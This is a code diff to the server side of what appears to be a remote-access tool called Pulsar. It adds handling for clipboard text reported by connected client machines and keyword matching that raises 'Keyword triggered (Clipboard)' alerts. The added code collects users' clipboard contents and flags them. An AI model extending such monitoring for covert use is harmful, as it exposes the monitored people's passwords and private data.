@@ -36,6 +36,8 @@ namespace Pulsar.Server.Messages
 
         public delegate void UserActiveWindowStatusUpdatedEventHandler(object sender, Client client, string newWindow);
 
+        public delegate void UserClipboardStatusUpdatedEventHandler(object sender, Client client, string clipboardText);
+
         /// <summary>
         /// Raised when a client updated its status.
         /// </summary>
@@ -55,6 +57,8 @@ namespace Pulsar.Server.Messages
         public event UserStatusUpdatedEventHandler UserStatusUpdated;
 
         public event UserActiveWindowStatusUpdatedEventHandler UserActiveWindowStatusUpdated;
+
+        public event UserClipboardStatusUpdatedEventHandler UserClipboardStatusUpdated;
 
         /// <summary>
         /// Reports an updated status.
@@ -82,8 +86,8 @@ namespace Pulsar.Server.Messages
                 var handler = UserStatusUpdated;
                 handler?.Invoke(this, (Client)c, userStatusMessage);
             }, client);
-        }
-
+        }        
+        
         private void OnUserActiveWindowStatusUpdated(Client client, string newWindow)
         {
             SynchronizationContext.Post(c =>
@@ -93,19 +97,28 @@ namespace Pulsar.Server.Messages
             }, client);
         }
 
+        private void OnUserClipboardStatusUpdated(Client client, string clipboardText)
+        {
+            SynchronizationContext.Post(c =>
+            {
+                var handler = UserClipboardStatusUpdated;
+                handler?.Invoke(this, (Client)c, clipboardText);
+            }, client);
+        }
+
         /// <summary>
         /// Initializes a new instance of the <see cref="ClientStatusHandler"/> class.
         /// </summary>
         public ClientStatusHandler() : base(true)
         {
-        }
+        }        
+        
+        /// <inheritdoc />
+        public override bool CanExecute(IMessage message) => message is SetStatus || message is SetUserStatus || message is SetUserActiveWindowStatus || message is SetUserClipboardStatus;
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is SetStatus || message is SetUserStatus || message is SetUserActiveWindowStatus;
-
-        /// <inheritdoc />
-        public override bool CanExecuteFrom(ISender sender) => true;
-
+        public override bool CanExecuteFrom(ISender sender) => true;        
+        
         /// <inheritdoc />
         public override void Execute(ISender sender, IMessage message)
         {
@@ -120,6 +133,9 @@ namespace Pulsar.Server.Messages
                 case SetUserActiveWindowStatus userActiveWindowStatus:
                     Execute((Client)sender, userActiveWindowStatus);
                     break;
+                case SetUserClipboardStatus userClipboardStatus:
+                    Execute((Client)sender, userClipboardStatus);
+                    break;
             }
         }
 
@@ -131,8 +147,8 @@ namespace Pulsar.Server.Messages
         private void Execute(Client client, SetUserStatus message)
         {
             OnUserStatusUpdated(client, message.Message);
-        }
-
+        }        
+        
         private void Execute(Client client, SetUserActiveWindowStatus message)
         {
             OnUserActiveWindowStatusUpdated(client, message.WindowTitle);
@@ -163,6 +179,44 @@ namespace Pulsar.Server.Messages
                                 frm.Invoke(new Action(() =>
                                 {
                                     FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Keyword triggered: " + matchedKeyword, message.WindowTitle);
+                                }));
+                            }
+                        }
+                    }
+                }
+            });
+        }
+
+        private void Execute(Client client, SetUserClipboardStatus message)
+        {
+            OnUserClipboardStatusUpdated(client, message.ClipboardText);
+
+            if (string.IsNullOrEmpty(message.ClipboardText))
+            {
+                return;
+            }
+
+            Task.Run(() =>
+            {
+                string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");
+
+                if (File.Exists(keywordsFilePath))
+                {
+                    string jsonContent = File.ReadAllText(keywordsFilePath);
+                    var keywords = JsonConvert.DeserializeObject<string[]>(jsonContent);
+
+                    if (keywords != null)
+                    {
+                        var matchedKeyword = keywords.FirstOrDefault(keyword => message.ClipboardText.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);
+
+                        if (matchedKeyword != null)
+                        {
+                            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
+                            if (frm != null)
+                            {
+                                frm.Invoke(new Action(() =>
+                                {
+                                    FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Keyword triggered (Clipboard): " + matchedKeyword, message.ClipboardText);
                                 }));
                             }
                         }
